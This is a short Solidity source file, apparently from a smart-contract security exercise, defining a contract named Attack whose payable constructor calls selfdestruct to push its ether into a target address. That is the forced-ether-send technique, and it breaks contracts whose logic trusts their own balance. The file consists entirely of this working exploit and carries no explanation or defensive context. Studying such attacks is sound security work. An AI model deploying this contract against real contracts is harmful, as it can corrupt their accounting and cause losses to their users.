// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;


contract Attack {
    constructor(address _addr) payable {
        selfdestruct(payable(_addr));
    }
}